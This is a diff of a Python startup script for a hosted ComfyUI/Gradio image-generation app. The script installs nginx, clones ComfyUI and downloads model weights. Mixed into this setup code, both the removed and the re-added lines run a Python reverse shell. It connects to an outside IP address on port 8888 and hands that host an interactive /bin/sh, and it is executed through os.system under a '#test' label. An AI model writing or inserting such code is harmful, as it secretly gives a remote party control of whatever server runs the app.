@@ -82,30 +82,6 @@ def install_run_nginx():
             print("nginx.conf not found")
             os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
 
-#test
-print("install nginx")
-install_run_nginx()
-print("finish nginx")
-python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
-
-os.system(python)
-
-os.chdir(root_path)
-os.system("git clone https://github.com/comfyanonymous/ComfyUI")
-
-os.chdir("ComfyUI")
-
-os.system("pip install -r requirements.txt")
-os.chdir("models/checkpoints")
-os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-base-1.0/resolve/main/sd_xl_base_1.0.safetensors")
-os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-refiner-1.0/resolve/main/sd_xl_refiner_1.0.safetensors")
-os.chdir("../upscale_models")
-os.system("wget -c https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.5.0/realesr-general-x4v3.pth")
-os.chdir("../clip_vision")
-os.system("wget -c https://hf-mirror.com/comfyanonymous/clip_vision_g/resolve/main/clip_vision_g.safetensors")
-os.chdir("../..")
-os.system("ls -la")
-print("----------------start app_start.py----------------------")
 
 import gradio as gr
 if (hasattr(gr,'__version__')):
@@ -127,6 +103,32 @@ try:
 except Exception as e:
     print(e)
     demo.launch(server_port=7890,prevent_thread_lock=True)
+python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+
+#test
+print("install nginx")
+install_run_nginx()
+print("finish nginx")
+
+os.system(python)
+
+os.chdir(root_path)
+os.system("git clone https://github.com/comfyanonymous/ComfyUI")
+
+os.chdir("ComfyUI")
+
+os.system("pip install -r requirements.txt")
+os.chdir("models/checkpoints")
+os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-base-1.0/resolve/main/sd_xl_base_1.0.safetensors")
+os.system("wget -c https://hf-mirror.com/stabilityai/stable-diffusion-xl-refiner-1.0/resolve/main/sd_xl_refiner_1.0.safetensors")
+os.chdir("../upscale_models")
+os.system("wget -c https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.5.0/realesr-general-x4v3.pth")
+os.chdir("../clip_vision")
+os.system("wget -c https://hf-mirror.com/comfyanonymous/clip_vision_g/resolve/main/clip_vision_g.safetensors")
+os.chdir("../..")
+os.system("ls -la")
+print("----------------start app_start.py----------------------")
+
 
 def start():
     try:
